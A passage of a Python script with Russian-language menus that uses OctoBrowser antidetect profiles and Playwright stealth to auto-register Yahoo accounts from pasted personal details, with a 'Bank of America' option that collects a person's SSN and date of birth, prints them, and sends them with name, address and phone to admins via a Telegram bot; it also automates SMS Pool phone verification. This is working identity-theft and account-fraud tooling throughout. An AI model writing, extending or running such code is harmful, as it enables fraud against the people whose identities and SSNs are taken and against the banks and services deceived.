                        gprint("❌ Не удалось создать профиль OctoBrowser.")
                        return
                        
                    profile_id = new_profile.get("uuid")
                    gprint(f"✓ Создан новый профиль с ID: {profile_id}")
                    
                    # Настройка прокси (опционально)
                    setup_proxy = input("\nНастроить прокси для профиля? (y/n): ").strip().lower() == 'y'
                    if setup_proxy:
                        proxy_string = input("Введите строку прокси (формат: тип://логин:пароль@хост:порт): ").strip()
                        if proxy_string:
                            success = await octo.update_proxy(profile_id, proxy_string)
                            if success:
                                gprint("✓ Прокси настроен успешно.")
                            else:
                                gprint("❌ Не удалось настроить прокси.")
                    
                    # Запускаем профиль в режиме stealth
                    launch_profile = input("\nЗапустить профиль в режиме антидетект? (y/n): ").strip().lower() == 'y'
                    if launch_profile:
                        url = input("Введите URL для открытия (по умолчанию: https://login.yahoo.com/account/create): ").strip()
                        if not url:
                            url = "https://login.yahoo.com/account/create"
                            
                        # Запускаем в режиме stealth
                        result = await octo.start_profile_with_stealth_playwright(profile_id, url)
                        
                        if result:
                            gprint("\n✓ Профиль запущен в режиме антидетект.")
                            gprint("Браузер успешно запущен с антидетект-защитой.")
                            input("Нажмите Enter для завершения сеанса браузера...")
                            
                            # Закрываем браузер после завершения
                            await result["browser"].close()
                            await result["playwright"].stop()
                            gprint("✓ Браузер закрыт.")
                
                asyncio.run(create_and_launch_profile())
            else:
                # Если ID профиля указан
                async def launch_existing_profile():
                    url = input("Введите URL для открытия (по умолчанию: https://login.yahoo.com/account/create): ").strip()
                    if not url:
                        url = "https://login.yahoo.com/account/create"
                        
                    # Запрашиваем, какой метод запуска использовать
                    gprint("\nВыберите метод запуска:")
                    gprint("1. Асинхронный запуск (стандартный)")
                    gprint("2. Синхронный запуск (для некоторых систем)")
                    method_choice = input("> ").strip()
                    
                    if method_choice == "2":
                        # Синхронный режим
                        gprint("\nЗапуск профиля в синхронном режиме...")
                        result = octo.start_profile_with_stealth_playwright_sync(profile_id, url)
                        
                        if result:
                            gprint("\n✓ Профиль запущен в режиме антидетект (синхронно).")
                            gprint("Браузер успешно запущен с антидетект-защитой.")
                            input("Нажмите Enter для завершения сеанса браузера...")
                            
                            # Закрываем браузер после завершения
                            result["browser"].close()
                            result["playwright"].stop()
                            gprint("✓ Браузер закрыт.")
                    else:
                        # Асинхронный режим (по умолчанию)
                        gprint("\nЗапуск профиля в асинхронном режиме...")
                        result = await octo.start_profile_with_stealth_playwright(profile_id, url)
                        
                        if result:
                            gprint("\n✓ Профиль запущен в режиме антидетект.")
                            gprint("Браузер успешно запущен с антидетект-защитой.")
                            input("Нажмите Enter для завершения сеанса браузера...")
                            
                            # Закрываем браузер после завершения
                            await result["browser"].close()
                            await result["playwright"].stop()
                            gprint("✓ Браузер закрыт.")
                
                asyncio.run(launch_existing_profile())
            
            input("\nНажмите Enter для возврата в главное меню...")
        elif choice == "4":
            print_profile()
        elif choice == "5":
            clear_and_print_art()
            gprint("\nАвтоматическая регистрация Yahoo")
            
            # Проверяем наличие введенных данных
            gprint("\nНеобходимо ввести данные для создания аккаунта:")
            gprint("Пример формата:")
            gprint("Abdulkadir Karshe")
            gprint("4821 S Mill Ave")
            gprint("Tempe, AZ 85282")
            gprint("December 1977")
            gprint("(480) 738-3552")
            gprint("\nВведите данные (пустая строка — завершить ввод):")
            
            lines = []
            while True:
                line = input()
                if line.strip() == '':
                    break
                lines.append(line)
            
            if len(lines) < 4:
                gprint("\n❌ Недостаточно данных. Нужны имя, адрес, дата рождения и телефон.")
                input("Нажмите Enter для возврата в меню...")
                continue
            
            user_data = '\n'.join(lines)
            
            # Запрашиваем ID профиля OctoBrowser
            profile_id = input("\nВведите ID профиля OctoBrowser (или оставьте пустым для создания нового): ").strip()
            
            if not profile_id:
                gprint("\nСоздание нового профиля...")
                profile_name = input("Введите имя для нового профиля: ").strip() or "Yahoo Profile"
                
                async def create_and_register():
                    # Создаем новый профиль
                    new_profile = await octo.create_profile(profile_name)
                    if not new_profile:
                        gprint("❌ Не удалось создать профиль OctoBrowser.")
                        return
                    
                    profile_id = new_profile.get("uuid")
                    gprint(f"✓ Создан новый профиль с ID: {profile_id}")
                    
                    # Запускаем процесс регистрации Yahoo
                    result = await octo.start_profile_with_yahoo_registration(profile_id, user_data)
                    if result:
                        # Проверяем на ответ NF
                        if result.get("nf_response"):
                            gprint("\n⚠️ Получен ответ NF - возвращаемся в главное меню")
                            return
                        
                        try:
                            gprint("\n✓ Регистрация Yahoo в процессе. Следите за прогрессом в браузере.")
                            input("Нажмите Enter для завершения сеанса браузера...")
                        finally:
                            # Закрываем браузер после завершения
                            await result["browser"].close()
                            await result["playwright"].stop()
                            gprint("✓ Браузер закрыт.")
                
                asyncio.run(create_and_register())
            else:
                # Используем существующий профиль
                async def register_with_existing():
                    # Запускаем процесс регистрации Yahoo
                    result = await octo.start_profile_with_yahoo_registration(profile_id, user_data)
                    if result:
                        # Проверяем на ответ NF
                        if result.get("nf_response"):
                            gprint("\n⚠️ Получен ответ NF - возвращаемся в главное меню")
                            return
                        
                        try:
                            gprint("\n✓ Регистрация Yahoo в процессе. Следите за прогрессом в браузере.")
                            input("Нажмите Enter для завершения сеанса браузера...")
                        finally:
                            # Закрываем браузер после завершения
                            await result["browser"].close()
                            await result["playwright"].stop()
                            gprint("✓ Браузер закрыт.")
                
                asyncio.run(register_with_existing())
            
            input("\nНажмите Enter для возврата в главное меню...")
        elif choice == "7":
            clear_and_print_art()
            gprint("\n🏦 Bank of America - Полная автоматизация регистрации")
             
            # Запрашиваем данные пользователя
            gprint("\nВведите данные пользователя для полной автоматизации:")
            gprint("Формат:")
            gprint("Имя Фамилия")
            gprint("Адрес")
            gprint("Город, Штат ZIP")
            gprint("Месяц Год")
            gprint("(Телефон)")
            gprint("(Email) - опционально")
            gprint("\nВведите данные (пустая строка - завершить):")
            gprint("ℹ️  Данные будут сохранены в папку data/")
            gprint("ℹ️  SSN и DOB будут автоматически добавлены после получения")
            
            lines = []
            while True:
                line = input()
                if line.strip() == '':
                    break
                lines.append(line)
            
            if len(lines) < 5:
                gprint("\n❌ Недостаточно данных. Нужны имя, адрес, дата рождения и телефон.")
                input("Нажмите Enter для возврата в меню...")
                continue
             
            # Сохраняем данные пользователя в папку data/
            user_data = {
                'name': lines[0] if len(lines) > 0 else '',
                'address': lines[1] if len(lines) > 1 else '',
                'city_state_zip': lines[2] if len(lines) > 2 else '',
                'birth_date': lines[3] if len(lines) > 3 else '',
                'phone': lines[4] if len(lines) > 4 else '',
                'email': lines[5] if len(lines) > 5 else ''
            }
            save_user_data_to_data_folder(user_data)
            
            # Парсим данные пользователя из папки data/
            parsed_data = parse_user_data_boa()
            
            if not parsed_data:
                gprint("\n❌ Не удалось распарсить данные пользователя.")
                input("Нажмите Enter для возврата в меню...")
                continue
             
            # Запрашиваем ID профиля OctoBrowser
            profile_id = input("\nВведите ID профиля OctoBrowser (или оставьте пустым для создания нового): ").strip()
            
            if not profile_id:
                gprint("\nСоздание нового профиля...")
                profile_name = parsed_data["profile_name"]
                
                async def create_and_register_yahoo():
                    # Создаем новый профиль
                    new_profile = await octo.create_profile(profile_name)
                    if not new_profile:
                        gprint("❌ Не удалось создать профиль OctoBrowser.")
                        return None
                    
                    profile_id = new_profile.get("uuid")
                    gprint(f"✅ ✓ Профиль OctoBrowser создан: {profile_id}")
                    
                    # Информируем пользователя о необходимости настройки прокси
                    gprint("⚠️ ⚠️ Автоматическая работа с прокси отключена в настройках")
                    gprint("⚠️ ⚠️ Будет выполнена только автоматизация Yahoo с получением SSN/DOB")
                    
                    # Запускаем процесс регистрации Yahoo
                    result = await octo.start_profile_with_yahoo_registration(profile_id, parsed_data)
                    if not result:
                        gprint("❌ Не удалось запустить автоматизацию Yahoo.")
                        return None
                    
                    if result.get("nf_response"):
                        gprint("\n⚠️ Получен ответ NF при регистрации Yahoo - прерываем")
                        return None
                        
                    gprint("\n✓ Регистрация Yahoo в процессе. Дождитесь завершения в браузере.")
                    gprint("⏱️ Ожидание подтверждения регистрации и получения SSN/DOB...")
                    
                    # После завершения регистрации Yahoo, ожидаем получения SSN и DOB из телеграма
                    confirmation = input("\n✅ Удалось ли зарегистрировать Yahoo и получить SSN/DOB? (y/n): ").strip().lower() == 'y'
                    
                    if confirmation:
                        gprint("\n✓ Отлично! Регистрация Yahoo успешно завершена.")
                        
                        # Закрываем предыдущий браузер
                        if result.get("page"):
                            await result["page"].close()
                        if result.get("browser"):
                            await result["browser"].close()
                        if result.get("playwright"):
                            await result["playwright"].stop()
                        
                        gprint("\n✅ Yahoo аккаунт успешно зарегистрирован!")
                        gprint(f"📋 ID профиля OctoBrowser: {profile_id}")
                        
                        # Обновляем данные пользователя, так как SSN и DOB были добавлены
                        updated_parsed_data = parse_user_data_boa()
                        if updated_parsed_data and updated_parsed_data.get("ssn") and updated_parsed_data.get("dob"):
                            gprint(f"\n✅ Данные SSN и DOB получены и сохранены:")
                            gprint(f"🆔 SSN: {updated_parsed_data.get('ssn')}")
                            gprint(f"📅 DOB: {updated_parsed_data.get('dob')}")
                        
                        return profile_id  # Возвращаем ID профиля, т.к. Yahoo регистрация завершена
                    else:
                        gprint("\n❌ Регистрация Yahoo не была завершена или SSN/DOB не получены")
                        # Удаляем профиль при неудаче
                        await delete_octobrowser_profile(profile_id)
                        gprint(f"✓ Профиль с ID: {profile_id} удален из-за ошибки")
                        return None
                
                created_profile_id = asyncio.run(create_and_register_yahoo())
            else:
                # Используем существующий профиль
                async def register_yahoo_with_existing():
                    # Информируем пользователя о необходимости настройки прокси
                    gprint("⚠️ ⚠️ Автоматическая работа с прокси отключена в настройках")
                    gprint("⚠️ ⚠️ Будет выполнена только автоматизация Yahoo с получением SSN/DOB")
                    
                    # Запускаем процесс регистрации Yahoo
                    result = await octo.start_profile_with_yahoo_registration(profile_id, parsed_data)
                    if not result:
                        gprint("❌ Не удалось запустить автоматизацию Yahoo.")
                        return False
                    
                    if result.get("nf_response"):
                        gprint("\n⚠️ Получен ответ NF при регистрации Yahoo - прерываем")
                        return False
                        
                    gprint("\n✓ Регистрация Yahoo в процессе. Дождитесь завершения в браузере.")
                    gprint("⏱️ Ожидание подтверждения регистрации и получения SSN/DOB...")
                    
                    # После завершения регистрации Yahoo, ожидаем получения SSN и DOB из телеграма
                    confirmation = input("\n✅ Удалось ли зарегистрировать Yahoo и получить SSN/DOB? (y/n): ").strip().lower() == 'y'
                    
                    if confirmation:
                        gprint("\n✓ Отлично! Регистрация Yahoo успешно завершена.")
                        
                        # Закрываем предыдущий браузер
                        if result.get("page"):
                            await result["page"].close()
                        if result.get("browser"):
                            await result["browser"].close()
                        if result.get("playwright"):
                            await result["playwright"].stop()
                        
                        gprint("\n✅ Yahoo аккаунт успешно зарегистрирован!")
                        gprint(f"📋 ID профиля OctoBrowser: {profile_id}")
                        
                        # Обновляем данные пользователя, так как SSN и DOB были добавлены
                        updated_parsed_data = parse_user_data_boa()
                        if updated_parsed_data and updated_parsed_data.get("ssn") and updated_parsed_data.get("dob"):
                            gprint(f"\n✅ Данные SSN и DOB получены и сохранены:")
                            gprint(f"🆔 SSN: {updated_parsed_data.get('ssn')}")
                            gprint(f"📅 DOB: {updated_parsed_data.get('dob')}")
                        
                        return True  # Yahoo успешно завершен
                    else:
                        gprint("\n❌ Регистрация Yahoo не была завершена или SSN/DOB не получены")
                        return False
                
                success = asyncio.run(register_yahoo_with_existing())
                created_profile_id = profile_id if success else None
            
            # Отправляем информацию о успешной регистрации Yahoo
            if created_profile_id:
                # Отправляем сообщение в Telegram бот
                gprint("\n📤 Отправка информации о успешной регистрации Yahoo в Telegram...")
                try:
                    # Получаем данные пользователя для отправки
                    message = f"✅ Успешная регистрация Yahoo!\n\n"
                    message += f"👤 {parsed_data.get('full_name', 'Имя не указано')}\n"
                    message += f"📧 {parsed_data.get('email', 'Email не указан')}@yahoo.com\n"
                    message += f"🏠 {parsed_data.get('address', '')} {parsed_data.get('city_state_zip', '')}\n"
                    message += f"📱 {parsed_data.get('phone', 'Телефон не указан')}\n"
                    
                    # Добавляем SSN и DOB если они есть
                    updated_data = parse_user_data_boa()
                    if updated_data and updated_data.get("ssn"):
                        message += f"🆔 SSN: {updated_data.get('ssn')}\n"
                    if updated_data and updated_data.get("dob"):
                        message += f"📅 DOB: {updated_data.get('dob')}\n"
                    
                    message += f"🌐 Profile ID: {created_profile_id}"
                    
                    # Используем dariloder для отправки сообщения админам
                    if hasattr(dariloder, 'bot_loop') and dariloder.bot_loop:
                        loop = dariloder.bot_loop
                        asyncio.run_coroutine_threadsafe(
                            dariloder.send_admin_message(message),
                            loop
                        )
                        gprint("\n✅ Информация успешно отправлена в Telegram!")
                    else:
                        gprint("\n⚠️ Telegram бот не инициализирован, сообщение не отправлено")
                except Exception as e:
                    gprint(f"\n❌ Ошибка при отправке сообщения в Telegram: {e}")
                
                gprint(f"\n✅ Процесс завершен. ID профиля: {created_profile_id}")
            else:
                gprint("\n❌ Профиль не был создан или Yahoo не был зарегистрирован")
            
            input("\nНажмите Enter для возврата в главное меню...")
        
        # Добавить обработку нового пункта меню 8 для серверного режима

        elif choice == "6":
            clear_and_print_art()
            gprint("\nОткрытие SMS Pool через Pyppeteer...")
            
            async def open_sms_pool():
                result = await octo.open_sms_pool_with_pyppeteer()
                if result:
                    gprint("✓ SMS Pool успешно открыт и закрыт")
                else:
                    gprint("❌ Ошибка при открытии SMS Pool")
            
            asyncio.run(open_sms_pool())
            
            input("\nНажмите Enter для возврата в главное меню...")
        elif choice == "9":
            clear_and_print_art()
            gprint("\nПриложение закрывается...")
            break
        else:
            clear_and_print_art()
            gprint("\nНекорректный выбор. Попробуйте снова.")
    
    # Код для принудительного завершения процесса
    if sys.platform == 'win32':
        try:
            os.system(f'taskkill /F /PID {os.getpid()}')
        except Exception:
            pass
        try:
            os.system('exit')
        except Exception:
            pass
        try:
            ctypes.windll.user32.PostQuitMessage(0)
        except Exception:
            pass
        os._exit(0)
    else:
        os._exit(0)

if __name__ == "__main__":
    main()
# Не забудьте установить необходимые библиотеки:
# pip install pillow pywhatkit
